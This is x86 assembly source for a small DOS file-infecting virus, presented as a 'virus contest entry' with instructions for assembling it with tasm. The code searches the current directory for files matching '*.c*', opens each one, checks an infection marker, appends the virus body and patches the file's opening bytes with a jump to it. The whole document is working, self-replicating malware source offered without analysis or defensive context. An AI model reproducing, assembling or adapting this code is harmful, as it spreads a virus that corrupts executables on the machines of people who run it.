

; VIRUS CONTEST ENTRY from The Stranger
; 139 bytes! (minus the host)
; assemble using tasm /m2



.model tiny
.code
          org    100h

entry: db 0e9h,0,0                      ; host portion

startvirus:
          call whereami
whereami: pop  bp
          sub  bp,offset whereami       ; where am I, Here!
          lea  si,[bp+offset origbytes]
          mov  di,100h
          push di
          movsw
          movsb
          lea  dx,[bp+offset maske]
          mov  ah,4eh                   ; find first file

findem:
          int  21h                      ; DS:DX points to *.com
          jc short done
          mov  dx,9eh                   ; filename in DTA
          mov  ax,3d02h                 ; Open read/write
          int  21h
          xchg ax,bx
          mov  ah,3fh                   ; Read file to buffer
          lea  dx,[bp+offset buffer]    ; DS:DX
          mov  cx,1Ah
          int  21h
          mov  ax,4202h                 ; point to end
          xor  cx,cx
          cwd
          int  21h

checkcom:
          mov  ax,ds:[09ah]
          mov  cx,word ptr [bp+buffer+1]        ; get jmp location
          add  cx,heap-startvirus+3             ; Adjust for virus size
          cmp  ax,cx                            ; Already infected  ??
          je short  find_next

infect:
          mov  cx,3
          push cx
          sub  ax,cx
          lea  si,[bp+offset buffer]
          lea  di,[bp+offset origbytes]
          movsw
          movsb
          mov  byte ptr [si-3],0e9h
          mov  word ptr [si-2],ax

finishinfection:
          mov  ah,40h
          lea  dx,[bp+offset startvirus]
          mov  cx,heap-startvirus
          int  21h
          mov  ax,4200h                 ; pointer to begining
          xor  cx,cx
          cwd
          int  21h
          mov  ah,40h                   ; Write to file from buffer
          lea  dx,[bp+offset buffer]
          pop  cx                       ; bytes
          int  21h

done_file:
          mov  ah,3eh                   ; Close file
          int  21h

done:
          retn                          ; left 100h on stack

find_next:
          mov  ah,4fh                   ; find next file
          jmp  short findem

origbytes db 0cdh,20h,0                 ; original 3 bytes of host file
maske  db '*.c*',0

heap:
buffer    db 1ah dup (?)
endheap:
end       entry

